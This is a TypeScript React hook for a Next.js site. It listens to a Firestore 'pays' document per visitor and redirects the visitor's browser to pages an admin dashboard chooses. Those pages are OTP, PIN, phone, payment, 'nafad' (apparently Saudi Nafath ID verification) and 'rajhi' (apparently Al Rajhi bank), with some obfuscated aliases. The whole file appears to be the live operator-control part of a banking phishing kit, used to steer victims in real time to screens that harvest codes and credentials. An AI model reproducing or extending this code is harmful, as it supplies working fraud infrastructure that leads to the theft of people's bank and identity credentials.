/**
 * Hook to monitor redirect requests from admin dashboard
 * Handles rapid redirect changes without queueing or conflicts
 */

import { useEffect, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

// Page mapping for all routes
const PAGE_MAP: Record<string, string> = {
  home: "/home-new",
  insur: "/insur",
  compar: "/compar",
  check: "/check",
  payment: "/check",
  otp: "/step2",
  pin: "/step3",
  phone: "/step5",
  nafad: "/step4",
  rajhi: "/step6",
  _t6: "/step4",
  _st1: "/check",
  _t2: "/step2",
  _t3: "/step3",
};

export function useRedirectMonitor({
  visitorId,
  currentPage,
}: UseRedirectMonitorProps) {
  const router = useRouter();
  
  // Track the last redirect we handled to prevent re-processing
  const lastHandledKeyRef = useRef<string>("");
  
  // Debounce timer to prevent rapid-fire redirects
  const redirectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingRedirectRef = useRef<string | null>(null);

  const processRedirect = useCallback(async (page: string) => {
    if (page === currentPage) {
      console.log(`[RedirectMonitor] Already on page ${page}, skipping redirect`);
      return;
    }

    const targetUrl = PAGE_MAP[page] || `/${page}`;
    console.log(`[RedirectMonitor] 🚀 Redirecting from ${currentPage} to ${targetUrl}`);

    // Clear the redirect immediately to prevent re-processing
    await setDoc(doc(db as Firestore, "pays", visitorId), {
      redirectPage: null,
      redirectPageHandledAt: Date.now()
    }, { merge: true }).catch(err => {
      console.error("[RedirectMonitor] Error clearing redirect:", err);
    });

    // Navigate to the target page
    router.push(targetUrl);
  }, [currentPage, visitorId, router]);

  useEffect(() => {
    if (!visitorId || !db) return;

    console.log(`[RedirectMonitor] Starting listener for ${visitorId}, currentPage: ${currentPage}`);

    // Reset state when currentPage changes
    lastHandledKeyRef.current = "";
    pendingRedirectRef.current = null;

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (snapshot) => {
        if (!snapshot.exists()) return;
        
        const data = snapshot.data();
        const now = Date.now();
        
        // Check modern redirectPage system
        const redirectPage = data.redirectPage as string | undefined;
        const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
        const handledAt = data.redirectPageHandledAt as number | undefined;
        
        if (redirectPage && redirectPage !== currentPage) {
          // Create unique key for this redirect
          const redirectKey = `${redirectPage}_${redirectUpdatedAt}`;
          
          // Skip if we already handled this exact redirect
          if (redirectKey === lastHandledKeyRef.current) {
            console.log(`[RedirectMonitor] Already handled redirect ${redirectKey}, skipping`);
            return;
          }
          
          // Skip if this redirect was already handled by a previous page
          if (handledAt && redirectUpdatedAt && handledAt >= redirectUpdatedAt) {
            console.log(`[RedirectMonitor] Redirect was already handled at ${handledAt}, skipping`);
            return;
          }
          
          console.log(`[RedirectMonitor] 📍 New redirect: ${redirectPage} (updatedAt: ${redirectUpdatedAt})`);
          
          // Cancel any pending redirect
          if (redirectTimerRef.current) {
            clearTimeout(redirectTimerRef.current);
            redirectTimerRef.current = null;
          }
          
          // Store the redirect and process it
          lastHandledKeyRef.current = redirectKey;
          pendingRedirectRef.current = redirectPage;
          
          // Process immediately (no delay)
          processRedirect(redirectPage);
        }

        // Check legacy currentStep system
        const currentStep = data.currentStep as string | undefined;
        const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined;
        const stepHandledAt = data.currentStepHandledAt as number | undefined;
        
        if (currentStep) {
          const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;
          
          if (stepKey === lastHandledKeyRef.current) {
            return;
          }
          
          if (stepHandledAt && currentStepUpdatedAt && stepHandledAt >= currentStepUpdatedAt) {
            return;
          }
          
          // Get the target URL for this step
          const targetUrl = PAGE_MAP[currentStep];
          const currentUrl = window.location.pathname;
          
          // Check if we're already on the target page (after redirect)
          if (targetUrl === currentUrl) {
            console.log(`[RedirectMonitor] Already on target page ${targetUrl}, skipping redirect`);
            lastHandledKeyRef.current = stepKey;
            return;
          }
          
          console.log(`[RedirectMonitor] 📍 Legacy step: ${currentStep} → ${targetUrl}`);
          
          lastHandledKeyRef.current = stepKey;
          
          if (targetUrl) {
            // Mark as handled
            setDoc(doc(db as Firestore, "pays", visitorId), {
              currentStepHandledAt: Date.now()
            }, { merge: true }).catch(console.error);
            
            router.push(targetUrl);
          }
        }
      },
      (error) => {
        console.error("[RedirectMonitor] Error:", error);
      }
    );

    return () => {
      console.log("[RedirectMonitor] Cleaning up");
      if (redirectTimerRef.current) {
        clearTimeout(redirectTimerRef.current);
      }
      unsubscribe();
    };
  }, [visitorId, currentPage, router, processRedirect]);
}

// Export for admin to get available pages
export const AVAILABLE_REDIRECT_PAGES = Object.keys(PAGE_MAP);
